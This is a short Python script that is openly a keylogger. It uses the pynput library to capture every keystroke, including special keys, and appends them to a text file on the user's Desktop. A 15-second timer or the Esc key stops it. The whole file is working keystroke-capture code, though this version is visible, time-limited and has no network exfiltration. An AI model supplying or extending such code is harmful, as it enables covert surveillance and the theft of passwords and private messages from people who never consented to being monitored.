import os
import time
import threading
from pynput import keyboard

# Define the log file path
LOG_FILE = os.path.join(os.path.expanduser("~"), "Desktop", "keylog.txt")

def on_press(key):
    """Handle key press events and log them to a file."""
    try:
        with open(LOG_FILE, 'a') as file:  # opens file in append mode
            if hasattr(key, 'char') and key.char:  # Alphanumeric keys
                file.write(key.char)
            else:  # Special keys
                special_keys = {
                    keyboard.Key.space: "[space]",
                    keyboard.Key.enter: "[enter]",
                    keyboard.Key.tab: "[tab]",
                    keyboard.Key.shift: "[shift]",
                    keyboard.Key.ctrl: "[ctrl]",
                    keyboard.Key.alt: "[alt]",
                    keyboard.Key.esc: "[esc]",
                    keyboard.Key.delete: "[delete]",
                    keyboard.Key.up: "[up]",
                    keyboard.Key.down: "[down]",
                    keyboard.Key.left: "[left]",
                    keyboard.Key.right: "[right]"
                }
                file.write(special_keys.get(key, f"[{key}]"))
    except Exception as e:
        print(f"[-] Failed to log key press: {e}")

def on_release(key):
    """Handle key release events."""
    print(f'{key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_keylogger():
    """Start the keylogger."""
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

def time_limit_check(duration):
    """Check if the time limit is reached and exit the program."""
    start = time.time()
    while True:
        if time.time() > start + duration:
            print("Time elapsed")
            os._exit(0)  # Exit the program
        time.sleep(1)  # Sleep to avoid busy-waiting

if __name__ == "__main__":
    duration = 15  # Define seconds
    keylogger_thread = threading.Thread(target=start_keylogger)
    timer_thread = threading.Thread(target=time_limit_check, args=(duration,))

    keylogger_thread.start()
    timer_thread.start()

    keylogger_thread.join()
    timer_thread.join()
